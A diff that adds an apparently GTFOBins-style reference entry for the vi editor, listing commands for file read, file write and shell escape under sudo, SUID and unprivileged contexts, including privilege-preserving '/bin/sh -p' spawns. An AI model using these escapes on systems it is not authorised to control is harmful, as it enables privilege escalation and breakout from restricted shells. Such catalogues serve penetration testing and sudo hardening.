@@ -1,0 +1,77 @@
+vi
+==
+
+File read
+---------
+
+[Sudo]
+    vi /path/to/input-file
+
+[SUID]
+    vi /path/to/input-file
+
+[Unprivileged]
+    vi /path/to/input-file
+
+File write
+----------
+
+[Sudo]
+    vi /path/to/output-file
+iDATA
+^[
+w
+    Where `^[` is the escape key.
+
+[SUID]
+    vi /path/to/output-file
+iDATA
+^[
+w
+    Where `^[` is the escape key.
+
+[Unprivileged]
+    vi /path/to/output-file
+iDATA
+^[
+w
+    Where `^[` is the escape key.
+
+Shell
+-----
+
+[Sudo]
+    vi -c ':!/bin/sh' /dev/null
+
+[SUID]
+    vi -c ':!/bin/sh' /dev/null
+
+[Unprivileged]
+    vi -c ':!/bin/sh' /dev/null
+
+[Sudo]
+    vi -c ':shell'
+
+[SUID]
+    vi -c ':shell'
+
+[Unprivileged]
+    vi -c ':shell'
+
+[Sudo]
+    vi -c ':set shell=/bin/sh | shell'
+
+[SUID]
+    vi -c ':set shell=/bin/sh\ -p | shell'
+
+[Unprivileged]
+    vi -c ':set shell=/bin/sh | shell'
+
+[Sudo]
+    vi -c :terminal /bin/sh
+
+[SUID]
+    vi -c ':terminal /bin/sh -p'
+
+[Unprivileged]
+    vi -c :terminal /bin/sh
